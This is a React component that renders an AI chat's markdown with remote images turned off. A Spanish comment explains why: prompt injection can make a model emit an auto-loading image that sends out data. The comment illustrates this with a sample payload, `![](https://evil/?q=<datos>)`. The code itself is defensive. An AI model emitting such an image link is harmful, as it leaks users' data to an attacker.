import Markdown, { type Components } from "react-markdown"
import remarkGfm from "remark-gfm"

// Markdown del chat SIN imágenes remotas: una imagen que carga sola es un canal de exfiltración
// por prompt injection (`![](https://evil/?q=<datos>)`). La URL se muestra como texto inerte.
// HTML crudo ya viene deshabilitado por react-markdown. Los links solo navegan por clic.
const components: Components = {
  img: ({ src, alt }) => (
    <span className="font-mono text-xs break-all text-muted-foreground">
      {alt ? `${alt} ` : ""}[{src}]
    </span>
  ),
  a: ({ href, children: label }) => (
    <a href={href} target="_blank" rel="noreferrer noopener" className="underline">
      {label}
    </a>
  ),
  // Tabla ancha scrollea dentro de su caja, no rompe el ancho del panel.
  table: ({ children }) => (
    <div className="overflow-x-auto">
      <table className="w-full border-collapse text-xs">{children}</table>
    </div>
  ),
}

export function ChatMarkdown({ children }: { children: string }) {
  return (
    <div className="flex flex-col gap-2 text-sm leading-relaxed [&_code]:font-mono [&_code]:text-xs [&_ol]:list-decimal [&_ol]:pl-5 [&_ul]:list-disc [&_ul]:pl-5 [&_td]:border [&_td]:px-2 [&_td]:py-1 [&_th]:border [&_th]:px-2 [&_th]:py-1 [&_th]:text-left [&_th]:font-medium">
      <Markdown remarkPlugins={[remarkGfm]} components={components}>
        {children}
      </Markdown>
    </div>
  )
}
